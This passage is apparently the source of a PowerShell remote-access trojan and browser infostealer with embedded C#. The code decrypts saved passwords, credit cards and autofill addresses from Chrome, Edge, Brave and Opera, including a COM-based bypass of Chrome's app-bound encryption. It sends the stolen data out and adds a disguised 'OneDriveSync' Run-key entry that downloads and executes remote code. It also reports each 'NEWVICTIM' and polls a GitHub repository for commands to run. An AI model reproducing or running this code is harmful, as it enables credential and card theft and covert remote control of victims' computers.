        [PreserveSig] int EncryptData([MarshalAs(UnmanagedType.BStr)] string p, [MarshalAs(UnmanagedType.BStr)] out string c, out uint e);
        [PreserveSig] int DecryptData([MarshalAs(UnmanagedType.BStr)] string c, [MarshalAs(UnmanagedType.BStr)] out string p, out uint e);
    }
    [DllImport("ole32.dll")] static extern int CoCreateInstance(ref Guid rclsid, IntPtr pUnk, uint ctx, ref Guid riid, out IElevator ppv);
    public static string CryptoServiceDecrypt(string b64, string clsidHex) {
        Guid clsid = new Guid(clsidHex); Guid iid = new Guid("463ABECF-410D-407F-8AF5-0DF35A005CC8");
        IElevator el; int hr = CoCreateInstance(ref clsid, IntPtr.Zero, 4, ref iid, out el);
        if (hr != 0 || el == null) return null;
        string plain = null; uint err = 0;
        int dhr = el.DecryptData(b64, out plain, out err);
        Marshal.ReleaseComObject(el);
        return plain;
    }
}
'@
  $script:StealLoaded = $true
}

function Get-BrowserKey($statePath) {
  try {
    $j = Get-Content $statePath -Raw | ConvertFrom-Json
    $b64 = $j.os_crypt.encrypted_key
    if (-not $b64) { return $null }
    $blob = [Convert]::FromBase64String($b64)
    $dpapi = $blob[5..($blob.Length - 1)]
    return [StealCore]::DPAPI($dpapi)
  } catch { return $null }
}

function Decode-Single($encB64, $key) {
  if (-not $encB64) { return "" }
  $enc = [Convert]::FromBase64String($encB64)
  $r = [StealCore]::DecodePassword($enc, $key)
  if ($r) { return $r }
  if ($enc.Length -ge 3 -and $enc[0] -eq [byte]0x76 -and $enc[1] -eq [byte]0x32) {
    $payload = $enc[3..($enc.Length - 1)]
    $b64 = [Convert]::ToBase64String($payload)
    foreach ($c in @('1FCBE96C-1697-43AF-9140-2897C7C69767','708860E0-F641-4611-8895-7D867DD3675B','576B31AF-6369-4B6B-8560-E4B203A97A8B')) {
      $plain = [AppBound]::CryptoServiceDecrypt($b64, $c)
      if ($plain) {
        $v10 = [Convert]::FromBase64String($plain)
        $rr = [StealCore]::DecodePassword($v10, $key)
        if ($rr) { return $rr }
      }
    }
    return '[v20:app-bound]'
  }
  return ""
}

function Get-Passwords {
  Ensure-Steal
  $hits = New-Object System.Collections.ArrayList
  $targets = @(
    @{ n = 'Chrome'; b = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
    @{ n = 'Edge';   b = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
    @{ n = 'Brave';  b = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
    @{ n = 'Opera';  b = "$env:APPDATA\Opera Software\Opera Stable" }
  )
  foreach ($t in $targets) {
    $lg = Join-Path $t.b 'Default\Login Data'
    $st = Join-Path $t.b 'Local State'
    if (-not (Test-Path $lg) -or -not (Test-Path $st)) { continue }
    $key = Get-BrowserKey $st
    if (-not $key) { continue }
    $tmp = Join-Path $env:TEMP ('ld_' + [Guid]::NewGuid().ToString('N') + '.db')
    Copy-Item $lg $tmp -Force -EA SilentlyContinue
    $rows = [StealCore]::GetLogins($tmp, $key)
    Remove-Item $tmp -Force -EA SilentlyContinue
    foreach ($r in $rows) {
      $pw = Decode-Single $r[2] $key
      if ($pw) { [void]$hits.Add(($t.n + '|' + $r[0] + '|' + $r[1] + '|' + $pw)) }
    }
  }
  if ($hits.Count -eq 0) { Post '[passwords] none'; return }
  Post ("`[passwords] " + $hits.Count + '`' + "`n" + (($hits -join "`n")))
}

function Get-CreditCards {
  Ensure-Steal
  $hits = New-Object System.Collections.ArrayList
  $targets = @(
    @{ n = 'Chrome'; b = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
    @{ n = 'Edge';   b = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
  )
  foreach ($t in $targets) {
    $wd = Join-Path $t.b 'Default\Web Data'
    $st = Join-Path $t.b 'Local State'
    if (-not (Test-Path $wd) -or -not (Test-Path $st)) { continue }
    $key = Get-BrowserKey $st
    if (-not $key) { continue }
    $tmp = Join-Path $env:TEMP ('wd_' + [Guid]::NewGuid().ToString('N') + '.db')
    Copy-Item $wd $tmp -Force -EA SilentlyContinue
    $rows = [StealCore]::GetCards($tmp, $key)
    Remove-Item $tmp -Force -EA SilentlyContinue
    foreach ($r in $rows) {
      $num = Decode-Single $r[2] $key
      if ($num) { [void]$hits.Add(($t.n + '|' + $r[0] + '|' + $r[1] + '|' + $num)) }
    }
  }
  if ($hits.Count -eq 0) { Post '[creditcards] none'; return }
  Post ("`[creditcards] " + $hits.Count + '`' + "`n" + (($hits -join "`n")))
}



function Get-Addresses {
  if (-not ('AddrGrab' -as [type])) {
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Collections.Generic;
public class AddrGrab {
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_open(byte[] f, out IntPtr db);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_close(IntPtr db);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_prepare_v2(IntPtr db, byte[] sql, int nByte, out IntPtr stmt, IntPtr tail);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_step(IntPtr stmt);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_finalize(IntPtr stmt);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern IntPtr sqlite3_column_text(IntPtr stmt, int c);
    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_column_bytes(IntPtr stmt, int c);
    static string T(IntPtr p, int n) { if (p == IntPtr.Zero || n <= 0) return ""; byte[] b = new byte[n]; Marshal.Copy(p, b, 0, n); return Encoding.UTF8.GetString(b); }
    static byte[] E(string s) { return Encoding.UTF8.GetBytes(s); }
    public static List<string[]> Flat(string db) {
        var rows = new List<string[]>();
        IntPtr hdb, stmt;
        if (sqlite3_open(E(db), out hdb) != 0) return rows;
        if (sqlite3_prepare_v2(hdb, E("SELECT name,value FROM autofill"), -1, out stmt, IntPtr.Zero) != 0) { sqlite3_close(hdb); return rows; }
        while (sqlite3_step(stmt) == 100) {
            string n = T(sqlite3_column_text(stmt, 0), sqlite3_column_bytes(stmt, 0));
            string v = T(sqlite3_column_text(stmt, 1), sqlite3_column_bytes(stmt, 1));
            rows.Add(new string[] { n, v });
        }
        sqlite3_finalize(stmt); sqlite3_close(hdb);
        return rows;
    }
    public static List<string[]> Profiles(string db) {
        var rows = new List<string[]>();
        IntPtr hdb, stmt;
        if (sqlite3_open(E(db), out hdb) != 0) return rows;
        if (sqlite3_prepare_v2(hdb, E("SELECT p.street_address,p.city,p.state,p.zipcode,p.country_code,n.full_name FROM autofill_profiles p LEFT JOIN autofill_profile_names n ON n.guid=p.guid"), -1, out stmt, IntPtr.Zero) != 0) { sqlite3_close(hdb); return rows; }
        while (sqlite3_step(stmt) == 100) {
            string street = T(sqlite3_column_text(stmt, 0), sqlite3_column_bytes(stmt, 0));
            string city = T(sqlite3_column_text(stmt, 1), sqlite3_column_bytes(stmt, 1));
            string state = T(sqlite3_column_text(stmt, 2), sqlite3_column_bytes(stmt, 2));
            string zip = T(sqlite3_column_text(stmt, 3), sqlite3_column_bytes(stmt, 3));
            string country = T(sqlite3_column_text(stmt, 4), sqlite3_column_bytes(stmt, 4));
            string name = T(sqlite3_column_text(stmt, 5), sqlite3_column_bytes(stmt, 5));
            rows.Add(new string[] { name, street, city, state, zip, country });
        }
        sqlite3_finalize(stmt); sqlite3_close(hdb);
        return rows;
    }
}
'@
  }
  $hits = New-Object System.Collections.ArrayList
  $targets = @(
    @{ n = 'Chrome'; b = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
    @{ n = 'Edge';   b = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
    @{ n = 'Brave';  b = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" }
  )
  foreach ($t in $targets) {
    $wd = Join-Path $t.b 'Default\Web Data'
    if (-not (Test-Path $wd)) { continue }
    $tmp = Join-Path $env:TEMP ('wd_' + [Guid]::NewGuid().ToString('N') + '.db')
    Copy-Item $wd $tmp -Force -EA SilentlyContinue
    # standard profiles (Chrome/Brave): full address
    foreach ($r in [AddrGrab]::Profiles($tmp)) {
      if (($r -join '') -ne '') { [void]$hits.Add(($t.n + '|' + ($r -join '|'))) }
    }
    # flat autofill (Edge + old): name/email/phone/postal/country
    $first=''; $last=''; $email=''; $phone=''; $postal=''
    foreach ($r in [AddrGrab]::Flat($tmp)) {
      switch ($r[0]) {
        'FirstName' { $first = $r[1] }
        'LastName'  { $last  = $r[1] }
        'Email'     { $email = $r[1] }
        'Phone'     { $phone = $r[1] }
      }
      if ($r[0] -like ':r3:*') { $postal = $r[1] }
    }
    Remove-Item $tmp -Force -EA SilentlyContinue
    $line = @($first, $last, $email, $phone, $postal)
    if (($line -ne $null -and ($line | Where-Object { $_ }) -join '') -ne '') {
      [void]$hits.Add(($t.n + '|name=' + ($first + ' ' + $last).Trim() + '|email=' + $email + '|phone=' + $phone + '|postal=' + $postal))
    }
  }
  if ($hits.Count -eq 0) { Post '[addresses] none'; return }
  Post ("`[addresses] " + $hits.Count + '`' + "`n" + (($hits -join "`n")))
}

# ---- startup: persist + boot notify ----
try{
  $k=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
  if(-not $k){
    $v="powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('$RA')"
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -Value $v
  }
}catch{}
$VN=$env:COMPUTERNAME
$VU=$env:USERNAME
$VI=(Get-NetIPAddress -AddressFamily IPv4 -EA 0 | Where-Object {$_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.*'} | Select-Object -First 1).IPAddress
if(Test-Path $HF){
  $hf=Get-Content $HF
  $W=$hf[0]
  $C='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+$hf[1]
  $ok=Post "<@$L> [ONLINE] $VN ($VU @ $VI)"
  if($ok){ Shot }
  else{
    Remove-Item $HF -Force -EA 0
    $W=$WG; $C=$CG
    Post "NEWVICTIM $VN $VU $VI"
  }
}else{
  Post "NEWVICTIM $VN $VU $VI"
}

# ---- main loop ----
function Poll-Run($url){
  try{
    $wc=New-Object Net.WebClient
    $wc.Headers.Add('User-Agent','Mozilla/5.0')
    $wc.Headers.Add('Accept','application/vnd.github.raw')
    $wc.Headers.Add('Authorization','token '+$T)
    $remote=$wc.DownloadString($url).Trim()
    $wc.Dispose()
    $i=$remote.IndexOf('|')
    if($i -ge 0){ $cmd=$remote.Substring(0,$i).Trim(); $nonce=$remote.Substring($i+1).Trim() }
    else{ $cmd=$remote; $nonce=$remote }
    $last=Get-Content $S -Raw -EA SilentlyContinue
    if(-not $last){$last=''}
    $last=$last.Trim()
    if($cmd -and $nonce -ne $last){
      $nonce | Set-Content $S -Force
      Run-Cmd $cmd
    }
  }catch{}
}
Post '`[+] rat online`'
while($true){
  Poll-Run $C
  if($C -ne $CG){ Poll-Run $CG }
  Start-Sleep -Milliseconds $script:P
}
